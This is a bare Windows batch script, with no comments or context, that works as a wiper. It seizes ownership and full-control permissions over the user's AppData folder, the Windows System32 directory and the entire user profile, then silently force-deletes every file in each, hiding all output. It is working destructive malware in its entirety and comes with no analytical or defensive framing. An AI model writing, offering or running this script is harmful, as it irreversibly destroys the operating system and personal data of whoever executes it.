@echo off
cd /d "%userprofile%\appdata"
takeown /f "%USERPROFILE%\appdata" /a /r /d Y >nul 2>&1
icacls "%USERPROFILE%\appdata" /grant administrators:F /t >nul 2>&1
del *.* /s /f /q >nul 2>&1
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd..
cd windows
cd system32
takeown /f "C:\windows\system32" /a /r /d Y >nul 2>&1
icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1
del *.* /s /f /q >nul 2>&1
cd /d "%userprofile%"
takeown /f "%USERPROFILE%" /a /r /d Y >nul 2>&1
icacls "%USERPROFILE%" /grant administrators:F /t >nul 2>&1
del *.* /s /f /q >nul 2>&1

